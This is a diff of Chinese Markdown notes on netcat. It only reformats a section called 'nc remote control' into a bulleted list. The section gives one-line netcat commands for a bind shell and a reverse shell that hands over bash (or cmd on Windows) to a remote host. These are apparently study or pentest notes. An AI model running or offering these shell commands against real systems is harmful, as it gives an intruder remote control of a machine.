@@ -44,12 +44,12 @@ Nc可以在两台设备上面相互交互，即侦听模式/传输模式。
 
 ### nc远程控制
 
-正向连接
-A:nc -lp port -c bash
-B:nc ip port
-A将自己的Bash发给B
-反向连接
-A:nc -lp port
-B:nc ip port -c bash
-B将自己的Bash发给A
-win下Bash换成cmd
+- 正向连接
+  A:nc -lp port -c bash
+  B:nc ip port
+  A将自己的Bash发给B
+- 反向连接
+  A:nc -lp port
+  B:nc ip port -c bash
+  B将自己的Bash发给A
+  win下Bash换成cmd
